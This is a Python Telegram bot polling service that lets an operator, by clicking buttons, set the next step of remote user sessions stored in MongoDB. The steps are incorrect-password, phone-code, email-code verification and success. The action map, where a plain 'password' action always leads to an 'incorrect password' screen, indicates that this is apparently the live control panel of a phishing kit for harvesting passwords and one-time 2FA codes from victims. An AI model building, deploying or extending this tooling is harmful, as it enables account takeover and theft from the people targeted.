#!/usr/bin/env python3
"""
Telegram Bot Polling Service
This runs continuously and listens for button clicks from Telegram
NOTE: In production with webhooks, this service is not needed
"""

import requests
import os
import time
import logging
from motor.motor_asyncio import AsyncIOMotorClient
import asyncio
from dotenv import load_dotenv
from pathlib import Path

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

BOT_TOKEN = os.environ['TELEGRAM_BOT_TOKEN']
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'false').lower() == 'true'

# Action mapping
ACTION_MAP = {
    'password': 'incorrect_password',
    'form': 'contact',
    'phone_code': 'verify_phone',
    'email_code': 'verify_email',
    'wrong_password': 'incorrect_password',
    'wrong_code': 'verify_phone',
    'finish': 'success'
}

async def set_user_action(session_id: str, action: str):
    """Set the next action for a user session"""
    try:
        next_step = ACTION_MAP.get(action, 'waiting')
        
        # First check if session exists
        session = await db.user_sessions.find_one({"session_id": session_id})
        
        if not session:
            logger.error(f"❌ Session NOT found in database: {session_id}")
            # List recent sessions for debugging
            recent = await db.user_sessions.find().sort('timestamp', -1).limit(5).to_list(5)
            logger.info(f"Recent session IDs: {[s['session_id'][:8] + '...' for s in recent]}")
            return False
        
        logger.info(f"✅ Session found: {session_id[:8]}... (current_step: {session.get('current_step')})")
        
        result = await db.user_sessions.update_one(
            {"session_id": session_id},
            {"$set": {"next_action": next_step}}
        )
        
        if result.modified_count > 0:
            logger.info(f"✅ Action set for session {session_id[:8]}...: {action} -> {next_step}")
            return True
        else:
            logger.warning(f"⚠️ Session found but not modified: {session_id}")
            return False
    except Exception as e:
        logger.error(f"❌ Error setting action: {e}")
        return False

def answer_callback_query(callback_query_id: str, text: str):
    """Answer callback query to show notification"""
    try:
        url = f"{API_URL}/answerCallbackQuery"
        payload = {
            'callback_query_id': callback_query_id,
            'text': text,
            'show_alert': True
        }
        response = requests.post(url, json=payload, timeout=5)
        return response.json()
    except Exception as e:
        logger.error(f"Error answering callback: {e}")
        return None

async def process_callback(callback_data: str, callback_query_id: str):
    """Process callback data from Telegram button"""
    try:
        # Parse: action_{session_id}_{action}
        if callback_data.startswith('action_'):
            parts = callback_data.split('_', 2)
            if len(parts) >= 3:
                session_id = parts[1]
                action = parts[2]
                
                logger.info(f"Processing callback: session={session_id}, action={action}")
                
                # Set action in database
                success = await set_user_action(session_id, action)
                
                if success:
                    answer_callback_query(
                        callback_query_id,
                        f"✅ Action set: {action}\nUser will be redirected to {ACTION_MAP.get(action, 'waiting')}"
                    )
                else:
                    answer_callback_query(
                        callback_query_id,
                        f"❌ Error: Session not found"
                    )
                
                return True
    except Exception as e:
        logger.error(f"Error processing callback: {e}")
        answer_callback_query(callback_query_id, f"❌ Error: {str(e)}")
        return False
    
    return False

async def poll_updates(offset=0):
    """Poll Telegram for updates"""
    try:
        url = f"{API_URL}/getUpdates"
        params = {
            'offset': offset,
            'timeout': 30,
            'allowed_updates': ['callback_query']
        }
        
        response = requests.get(url, params=params, timeout=35)
        data = response.json()
        
        if data.get('ok'):
            updates = data.get('result', [])
            
            for update in updates:
                update_id = update.get('update_id')
                
                if 'callback_query' in update:
                    callback = update['callback_query']
                    callback_data = callback.get('data', '')
                    callback_query_id = callback.get('id')
                    
                    logger.info(f"Received callback: {callback_data}")
                    await process_callback(callback_data, callback_query_id)
                
                # Update offset to mark this update as processed
                offset = update_id + 1
        
        return offset
    
    except requests.exceptions.Timeout:
        logger.debug("Polling timeout, continuing...")
        return offset
    except Exception as e:
        logger.error(f"Polling error: {e}")
        time.sleep(5)
        return offset

async def main():
    """Main polling loop"""
    if USE_WEBHOOK:
        logger.info("⚠️  Webhook mode is enabled - polling is not needed")
        logger.info("Telegram bot will receive updates via webhook at /api/telegram/webhook")
        logger.info("Service running in standby mode (webhook handles all updates)")
        
        # Keep service alive in standby mode
        while True:
            await asyncio.sleep(3600)  # Sleep for 1 hour, repeat
        return
    
    logger.info("🤖 Telegram Bot Polling Started!")
    logger.info(f"Bot: @Jetonn_bot")
    logger.info(f"Listening for button clicks...")
    
    offset = 0
    
    while True:
        try:
            offset = await poll_updates(offset)
            await asyncio.sleep(0.1)  # Small delay between polls
        except KeyboardInterrupt:
            logger.info("Bot stopped by user")
            break
        except Exception as e:
            logger.error(f"Main loop error: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n👋 Bot stopped")
